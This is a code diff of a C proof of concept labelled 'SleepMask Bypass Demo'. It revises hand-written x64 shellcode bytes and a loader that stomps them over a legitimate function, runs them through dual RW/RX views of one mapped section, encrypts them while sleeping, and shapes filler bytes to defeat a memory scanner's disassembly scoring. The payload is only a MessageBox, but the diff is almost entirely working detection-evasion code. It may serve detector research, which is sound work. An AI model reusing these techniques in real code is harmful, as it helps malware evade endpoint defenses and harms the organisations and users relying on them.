@@ -242,35 +242,39 @@ STB_SEG NOINLINE static void StubSleep(void) {
 //  0x83: "Hello from PIC shellcode\0" (text)
 // total 0x9B bytes of code+strings (declared [0x9D], trailing zero padding);
 // scan window = [0x15, 0x3D) stays plaintext while sleeping
-static const unsigned char kShellcode[0x9D] = {
+static const unsigned char kShellcode[0xA4] = {
     0x48, 0x83, 0xEC, 0x28,                               // 0x00
     0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,       // 0x04
     0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,       // 0x0C
-    // 0x15-0x25: scoring filler (sub rsp,0 x5 + nop) so the detector's
-    // disasm window scores >=2 from the window origin — slide distance 0
-    0x90, 0x48, 0x83, 0xEC, 0x00, 0x48, 0x83, 0xEC,       // 0x14
-    0x00, 0x48, 0x83, 0xEC, 0x00, 0x48, 0x83, 0xEC,       // 0x1C
-    0x00, 0x90,                                           // 0x24
-    0x8B, 0x05, 0x00, 0x00, 0x00, 0x00,                   // 0x26 slot A
-    0x89, 0x44, 0x24, 0x20,                               // 0x2C
-    0xE8, 0x00, 0x00, 0x00, 0x00,                         // 0x30 slot B
-    0x8B, 0x05, 0x00, 0x00, 0x00, 0x00,                   // 0x35 slot C
-    0xFF, 0xC0,                                           // 0x3B
-    0x89, 0x05, 0x00, 0x00, 0x00, 0x00,                   // 0x3D slot D
-    0x48, 0x8D, 0x15, 0x00, 0x00, 0x00, 0x00,             // 0x43 slot E
-    0x4C, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,             // 0x4A slot F
-    0x45, 0x33, 0xC9,                                     // 0x51
-    0x33, 0xC9,                                           // 0x54
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,       // 0x14 (0x14-0x1B: encrypted prefix)
+    // 0x1C: scoring filler aligned so the disasm window origin (0x20) is an
+    // instruction boundary and scores >=2 from the origin (slide 0)
+    0x48, 0x83, 0xEC, 0x00, 0x48, 0x83, 0xEC, 0x00,       // 0x1C
+    0x66, 0x90,                                           // 0x24
+    // rbx = &g_shared once; all cross-image refs go through [rbx+disp8]
+    0x48, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00,                                                 // 0x26 slot R (g_shared imm64)
+    0x89, 0x44, 0x24, 0x20,                               // 0x30 scoring op (mov [rsp+0x20],eax)
     0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00,                                                 // 0x56 slot G (imm64)
-    0xFF, 0xD0,                                           // 0x60
-    0x89, 0x05, 0x00, 0x00, 0x00, 0x00,                   // 0x62 slot H (result store)
-    0x48, 0x83, 0xC4, 0x28,                               // 0x68
-    0xC3,                                                 // 0x6C
-    // 0x6D caption
+    0x00,                                                 // 0x34 slot S (StubSleep imm64)
+    0xFF, 0xD0,                                           // 0x3E call rax (ret = 0x40)
+    0x8B, 0x43, 0x00,                                     // 0x40 slot C (mov eax,[rbx+off_calls])
+    0xFF, 0xC0,                                           // 0x43
+    0x89, 0x43, 0x00,                                     // 0x45 slot D (mov [rbx+off_calls],eax)
+    0x48, 0x8D, 0x15, 0x00, 0x00, 0x00, 0x00,             // 0x48 slot E (text @ 0x82)
+    0x4C, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,             // 0x4F slot F (caption @ 0x6C)
+    0x45, 0x33, 0xC9,                                     // 0x56
+    0x33, 0xC9,                                           // 0x59
+    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00,                                                 // 0x5B slot G (MessageBoxA imm64)
+    0xFF, 0xD0,                                           // 0x65
+    0x89, 0x43, 0x00,                                     // 0x67 slot H (mov [rbx+off_reserved],eax)
+    0x48, 0x83, 0xC4, 0x28,                               // 0x6A
+    0xC3,                                                 // 0x6E
+    // 0x6F caption
     'S', 'l', 'e', 'e', 'p', 'M', 'a', 's', 'k', ' ', 'B', 'y', 'p', 'a',
     's', 's', ' ', 'D', 'e', 'm', 'o', 0,
-    // 0x83 text
+    // 0x82 text
     'H', 'e', 'l', 'l', 'o', ' ', 'f', 'r', 'o', 'm', ' ', 'P', 'I', 'C',
     ' ', 's', 'h', 'e', 'l', 'l', 'c', 'o', 'd', 'e', 0
 };
@@ -451,10 +455,11 @@ static int RunExperiment(const wchar_t* mode) {
         }
         shellBase = (ULONGLONG)(uintptr_t)execBase;
     } else if (mapmode) {
-        // Two simultaneous views over one section: RW view for writes, RX
-        // view for execution — no protection flips. RX view must sit within
-        // +-2GB of the image for the shellcode's E8 rel32 to StubSleep.
-        ULONGLONG image = (ULONGLONG)(uintptr_t)&StompTarget;
+        // Dual-view live mode: one section mapped twice — RW view for
+        // writes (stomp/encrypt), RX view for execution. No page in the
+        // process is RWX; .pay is never touched (stays pristine on disk).
+        // Views are system-placed: the shellcode calls StubSleep through an
+        // absolute `mov rax,imm64; call rax`, so no +-2GB constraint.
         HANDLE hMap = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL,
                                          PAGE_EXECUTE_READWRITE, 0, 0x2000,
                                          NULL);
@@ -467,39 +472,31 @@ static int RunExperiment(const wchar_t* mode) {
             printf("[-] MapViewOfFile(RW) failed: %lu\n", GetLastError());
             return 1;
         }
-        BYTE* rxView = NULL;
-        LONGLONG probes[] = { -0x100000LL, -0x400000LL, -0x1000000LL,
-                              -0x4000000LL, -0x10000000LL, 0x100000LL,
-                              0x400000LL,  0x1000000LL,  0x4000000LL };
-        for (int k = 0; k < (int)(sizeof(probes) / sizeof(probes[0])); k++) {
-            ULONGLONG cand = (image + probes[k]) & ~0xFFFFLL; // 64KB-aligned
-            LONGLONG d = (LONGLONG)(uintptr_t)&StubSleep -
-                         ((LONGLONG)cand + 0x35);
-            if (d < INT32_MIN || d > INT32_MAX) continue;
-            LPVOID rsv = VirtualAlloc((LPVOID)cand, 0x2000, MEM_RESERVE,
-                                      PAGE_NOACCESS);
-            if (!rsv) continue;
-            rxView = (BYTE*)MapViewOfFileEx(hMap, FILE_MAP_EXECUTE, 0, 0,
-                                            0x2000, rsv);
-            if (rxView) break;
-            printf("[walkmap] probe %p: MapViewOfFileEx failed %lu "
-                   "(reserve ok)\n", (void*)cand, GetLastError());
-            VirtualFree(rsv, 0, MEM_RELEASE);
-        }
+        BYTE* rxView = (BYTE*)MapViewOfFile(hMap,
+                                            FILE_MAP_READ | FILE_MAP_EXECUTE,
+                                            0, 0, 0x2000);
         if (!rxView) {
-            printf("[-] could not map RX view within +-2GB of the image\n");
+            printf("[-] MapViewOfFile(RX) failed: %lu\n", GetLastError());
             return 1;
         }
         g_mapHandles[0] = hMap;
         g_mapHandles[1] = rwView;
         execBase = rxView;
         shellBase = (ULONGLONG)(uintptr_t)rxView;
-        printf("[walkmap] RX view %p (MEM_MAPPED, X) <-> RW view %p "
-               "(MEM_MAPPED, RW), same physical pages\n", rxView, rwView);
+        {
+            char dbg[160];
+            snprintf(dbg, sizeof(dbg), "hMap=%p rwView=%p rxView=%p",
+                     (void*)hMap, (void*)rwView, (void*)rxView);
+            MarkStage(dbg);
+        }
+        printf("[walkmap-live] RX view %p (MEM_MAPPED, X) <-> RW view %p "
+               "(MEM_MAPPED, RW), same physical pages; .pay untouched\n",
+               rxView, rwView);
     }
 
     unsigned char shell[sizeof(kShellcode)];
     memcpy(shell, kShellcode, sizeof(shell));
+    ULONGLONG stubSleepAddr = (ULONGLONG)(uintptr_t)&StubSleep;
 
     // adapt the shellcode's stack allocation to the compiled stomp target:
     // `sub rsp,<imm8>` -> mirror the imm8 in shellcode sub/add so .pdata
@@ -513,18 +510,17 @@ static int RunExperiment(const wchar_t* mode) {
             return 1;
         }
         shell[0x03] = origPro[3]; // sub rsp, imm8
-        shell[0x6B] = origPro[3]; // add rsp, imm8
+        shell[0x6D] = origPro[3]; // add rsp, imm8 (0x6A: 48 83 C4 imm8)
         printf("[adapt] stomp-target prologue sub rsp,0x%02X (shellcode matches)\n",
                origPro[3]);
     }
 
-    PatchSlot(shell, shellBase, 0x2C, (ULONGLONG)(uintptr_t)&g_shared.reserved);
-    PatchSlot(shell, shellBase, 0x35, (ULONGLONG)(uintptr_t)&StubSleep);
-    PatchSlot(shell, shellBase, 0x3B, (ULONGLONG)(uintptr_t)&g_shared.calls);
-    PatchSlot(shell, shellBase, 0x43, (ULONGLONG)(uintptr_t)&g_shared.calls);
-    PatchSlot(shell, shellBase, 0x4A, shellBase + 0x83); // text (lpText, rdx) — 'H' at +0x83
-    PatchSlot(shell, shellBase, 0x51, shellBase + 0x6D); // caption (lpCaption -> title) — 'S' at +0x6D
-    PatchSlot(shell, shellBase, 0x68, (ULONGLONG)(uintptr_t)&g_shared.reserved);
+    // rbx-based absolute addressing: all cross-image refs go through
+    // [rbx+disp8] so the shellcode runs from any address (dual views live
+    // far from the image — rip-relative disp32 would truncate).
+    ULONGLONG gSharedAddr = (ULONGLONG)(uintptr_t)&g_shared;
+    unsigned char offCalls = (unsigned char)((char*)&g_shared.calls - (char*)&g_shared);
+    unsigned char offReserved = (unsigned char)((char*)&g_shared.reserved - (char*)&g_shared);
 
     // resolve MessageBoxA at load time (PIC shellcode has no imports)
     HMODULE hUser32 = LoadLibraryA("user32.dll");
@@ -534,8 +530,16 @@ static int RunExperiment(const wchar_t* mode) {
         return 1;
     }
     ULONGLONG msgBoxAddr = (ULONGLONG)(uintptr_t)msgBox;
-    memcpy(shell + 0x58, &msgBoxAddr, 8); // slot G (mov rax, imm64)
     printf("[adapt] MessageBoxA = 0x%llX\n", msgBoxAddr);
+
+    memcpy(shell + 0x28, &gSharedAddr, 8);      // slot R (mov rbx, &g_shared) imm64@0x28
+    memcpy(shell + 0x36, &stubSleepAddr, 8);    // slot S (StubSleep imm64) — mov rax @0x34, imm64@0x36
+    shell[0x42] = offCalls;                     // slot C (mov eax,[rbx+calls])
+    shell[0x47] = offCalls;                     // slot D (mov [rbx+calls],eax)
+    PatchSlot(shell, shellBase, 0x4F, shellBase + 0x85); // slot E: text (lpText, rdx) — 'H' at +0x85
+    PatchSlot(shell, shellBase, 0x56, shellBase + 0x6F); // slot F: caption (lpCaption -> title) — 'S' at +0x6F
+    memcpy(shell + 0x5D, &msgBoxAddr, 8);       // slot G (MessageBoxA imm64) — mov rax @0x5B, imm64@0x5D
+    shell[0x69] = offReserved;                  // slot H (mov [rbx+reserved],eax)
 
     // Save the pristine StompTarget image before stomping (content-restore
     // mode restores it while sleeping, then re-stomps on wake).
@@ -546,21 +550,22 @@ static int RunExperiment(const wchar_t* mode) {
     BYTE* writeTarget = mapmode ? (BYTE*)g_mapHandles[1] : execBase;
     memcpy(writeTarget, shell, sizeof(shell));
     memcpy(g_shellcodeCopy, shell, sizeof(g_shellcodeCopy));
+    MarkStageHex("[post-stomp] exec view:", (const void*)shellBase, 0xB0);
 
     // self-check: the patched string offsets must match the template layout
-    const char* capStr = (const char*)(shellBase + 0x6D);
-    const char* txtStr = (const char*)(shellBase + 0x83);
+    const char* capStr = (const char*)(shellBase + 0x6F);
+    const char* txtStr = (const char*)(shellBase + 0x85);
     if (strcmp(capStr, "SleepMask Bypass Demo") != 0 ||
         strcmp(txtStr, "Hello from PIC shellcode") != 0) {
         printf("[-] string layout mismatch! caption=[%s] text=[%s]\n", capStr,
                txtStr);
         return 1;
     }
-    printf("[adapt] strings OK: caption@+0x6D text@+0x83\n");
+    printf("[adapt] strings OK: caption@+0x6F text@+0x85\n");
 
     ULONG ms = 8000;
     g_shared.shellBase = shellBase;
-    g_shared.islandStart = shellBase + 0x15; // plaintext island starts at window base
+    g_shared.islandStart = shellBase + 0x20; // plaintext island starts at window base (ret=0x40)
     g_shared.sleepMs = ms;
     g_shared.key = 0xA5;
     g_shared.calls = 0;
@@ -576,7 +581,7 @@ static int RunExperiment(const wchar_t* mode) {
 
     // dump the stomped bytes for layout verification
     {
-        unsigned char raw[0xA0];
+        unsigned char raw[0xB0];
         memcpy(raw, (const void*)shellBase, sizeof(raw));
         printf("[layout] stomped shellcode:");
         for (int i = 0; i < (int)sizeof(raw); i++) {
@@ -584,7 +589,7 @@ static int RunExperiment(const wchar_t* mode) {
             printf("%02X ", raw[i]);
         }
         printf("\n");
-        MarkStageHex("[layout] shellcode:", (const void*)shellBase, 0x9D);
+        MarkStageHex("[layout] shellcode:", (const void*)shellBase, 0xA4);
     }
 
     // Standalone PoC: no detector child process is spawned. Use -scan to
